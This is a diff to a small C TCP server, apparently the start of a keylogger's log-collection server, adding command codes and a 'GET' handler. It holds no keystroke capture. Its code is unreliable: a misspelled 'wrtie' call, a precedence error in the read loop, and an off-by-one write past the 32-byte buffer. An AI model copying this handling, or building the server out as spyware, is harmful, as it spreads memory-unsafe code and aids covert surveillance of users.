@@ -6,9 +6,15 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 
-
+#define GET_LOG 100
+#define SEND_LOG 101
+#define FAIL_SEND 102
+#define EXIT_CMD 900
+#define EXIT_PRC 901
+#define MAX 32
 
 void error_handling(char *message);
+
 
 int main(int argc, char *argv[])
 
@@ -18,7 +24,13 @@ int main(int argc, char *argv[])
 	struct sockaddr_in serv_addr;
 	struct sockaddr_in clnt_addr;
 	int clnt_addr_size;
-	char message[] = "Hello!\n";
+	char message[] = "Welcome to Keylogger World!\n";
+
+	char readmsg[MAX]; // string from client
+	char *tmp; 
+	int n,i=0;
+	int len;
+
 
 
 	if (argc != 2) {
@@ -49,8 +61,30 @@ int main(int argc, char *argv[])
 		if (client_sock == -1)
 			error_handling("accept() error");
 
-		write(client_sock, message, sizeof(message)); /* 데이터 전송 */
-		printf("Message in server : %s \n", message);
+
+		len = 0;
+		tmp = readmsg;
+
+		while((n=read(client_sock ,tmp , 1)>0))
+		{
+			if(*tmp == '\r') continue;
+			if(*tmp == '\n') break;
+			if(*tmp == '\0') break;
+
+			if(len == MAX) break;
+
+			tmp++;
+			len++;
+		}
+
+		readmsg[len] = '\0';
+		if(strcmp(readmsg, "GET") == 0)
+		{
+			n= strlen(message);
+			wrtie(client_sock, message , n);
+		}
+		//write(client_sock, message, sizeof(message)); /* 데이터 전송 */
+		//printf("Message in server : %s \n", message);
 		close(client_sock); /* 연결 종료 */
 	}
 	return 0;
